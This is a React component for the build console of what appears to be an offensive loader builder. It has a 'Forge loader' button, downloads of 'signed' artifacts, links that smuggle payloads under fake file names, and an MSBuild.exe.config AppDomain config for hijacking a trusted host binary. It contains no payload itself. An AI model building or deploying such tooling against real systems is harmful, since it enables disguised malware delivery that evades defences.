import { useRef, useEffect } from 'react'
import DeliveryCard from './DeliveryCard'
import { createSmugLink } from '../api/smuggler'
import { appdomainConfigFilename } from '../api/generate'

export interface LogLine { ts: string; tag: string; msg: string }
export type BuildStatus = 'idle' | 'building' | 'done' | 'error'

const STATUS_LABEL: Record<BuildStatus, string> = {
  idle: 'Idle', building: 'Building', done: 'Complete', error: 'Error',
}
const STATUS_CLASS: Record<BuildStatus, string> = {
  idle: 'idle', building: 'running', done: 'done', error: 'idle',
}

interface Props {
  logs:           LogLine[]
  status:         BuildStatus
  canForge:       boolean
  onForge:        () => void
  onClear:        () => void
  artifactId:     string | null
  artifactName:   string | null
  artifactSize?:  number
  smugHost:       string
  configXml?:     string | null
  configFilename?: string
  summary?:       string
}

export default function BuildConsole({
  logs, status, canForge, onForge, onClear,
  artifactId, artifactName, artifactSize,
  smugHost, configXml, configFilename, summary,
}: Props) {
  // Fall back to the default host binary's sidecar (MSBuild.exe.config) via
  // the shared helper so the literal string lives in exactly one place.
  const configName = configFilename || appdomainConfigFilename()
  const termRef = useRef<HTMLDivElement>(null)
  useEffect(() => {
    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight
  }, [logs])

  const running = status === 'building'
  const done    = status === 'done'

  return (
    <>
      <div className="build-header">
        <div>
          <div className="title">Build console</div>
          <div className="sub">Streaming compiler output</div>
        </div>
        <div className="right">
          <span className={'build-status ' + STATUS_CLASS[status]}>
            <span className="led"/>{STATUS_LABEL[status]}
          </span>
          <button className="btn btn-sm" onClick={onClear} disabled={running}>Clear</button>
        </div>
      </div>

      <div className="build-mid" style={{ display: 'flex', flexDirection: 'column', flex: 1, minHeight: 0 }}>
        <div className="term" ref={termRef}>
          {logs.length === 0 && !running && (
            <div className="term-empty">
              awaiting build · press <span style={{ color: 'var(--blue-400)' }}>Forge</span> to compile<span className="blink">_</span>
            </div>
          )}
          {logs.map((l, i) => (
            <div className="term-line" key={i}>
              <span className="ts">{l.ts}</span>
              <span className={'tag tag-' + l.tag}>[{l.tag}]</span>
              <span className="msg">{l.msg}</span>
            </div>
          ))}
          {running && (
            <div className="term-line">
              <span className="ts">{new Date().toISOString().slice(11, 19)}</span>
              <span className="tag tag-info">[…]</span>
              <span className="msg">working…</span>
            </div>
          )}
        </div>
        {done && artifactId && artifactName && (
          <DeliveryCard
            artifactName={artifactName}
            stageHost={smugHost}
            downloadId={artifactId}
            onSmuggle={(fakeName) => createSmugLink(artifactId, fakeName)}
          />
        )}
        {done && configXml && (
          <div style={{ padding: '0 14px 12px' }}>
            <div style={{
              border: '1px solid var(--line)', borderRadius: 8, overflow: 'hidden',
              background: 'var(--surface)',
            }}>
              <div style={{
                display: 'flex', justifyContent: 'space-between', alignItems: 'center',
                padding: '8px 12px', background: 'var(--surface-2)',
                borderBottom: '1px solid var(--line)',
              }}>
                <span style={{ fontFamily: 'var(--mono)', fontSize: 11, color: 'var(--muted)' }}>
                  {configName}
                </span>
                <button className="btn btn-sm btn-ghost"
                  onClick={() => navigator.clipboard?.writeText(configXml)}>Copy</button>
              </div>
              <textarea
                readOnly value={configXml} rows={6}
                style={{
                  width: '100%', fontFamily: 'var(--mono)', fontSize: 10,
                  padding: '8px 12px', border: 0, outline: 0, resize: 'none',
                  background: 'var(--surface)', color: 'var(--ink-2)',
                }}
              />
            </div>
          </div>
        )}
      </div>

      <div className="action-bar">
        <div className="summary">{summary || '—'}</div>
        <div className="spacer"/>
        {done && artifactId && artifactName && (
          <div className="artifact-card">
            <div className="filebox">{(artifactName.split('.').pop() || 'EXE').toUpperCase().slice(0, 3)}</div>
            <div>
              <div className="fname">{artifactName}</div>
              <div className="fdetails">{artifactSize ? bytesToSize(artifactSize) : ''} · signed</div>
            </div>
            <button className="btn btn-sm btn-soft"
              onClick={async () => {
                const token = localStorage.getItem('defcrow_token') ?? ''
                try {
                  const res = await fetch(`/api/download/${artifactId}`, {
                    headers: { Authorization: `Bearer ${token}` },
                  })
                  if (!res.ok) throw new Error(`HTTP ${res.status}`)
                  const blob = await res.blob()
                  const url  = URL.createObjectURL(blob)
                  const a    = document.createElement('a')
                  a.href = url; a.download = artifactName
                  document.body.appendChild(a); a.click()
                  setTimeout(() => { URL.revokeObjectURL(url); a.remove() }, 0)
                } catch (e) {
                  alert(`Download failed: ${e instanceof Error ? e.message : 'unknown error'}`)
                }
              }}>
              <svg className="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.7">
                <path d="M12 4v12m0 0l-5-5m5 5l5-5M4 20h16"/>
              </svg>
              <span>Download</span>
            </button>
          </div>
        )}
        <button className="btn btn-primary" disabled={!canForge || running} onClick={onForge}>
          <svg className="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M6 4l14 8-14 8z"/></svg>
          <span>{running ? 'Forging…' : done ? 'Re-forge' : 'Forge loader'}</span>
        </button>
      </div>
    </>
  )
}

function bytesToSize(n: number): string {
  if (!n) return '0 B'
  const k = 1024, units = ['B','KB','MB','GB']
  const i = Math.floor(Math.log(n)/Math.log(k))
  return (n/Math.pow(k,i)).toFixed(i?2:0) + ' ' + units[i]
}
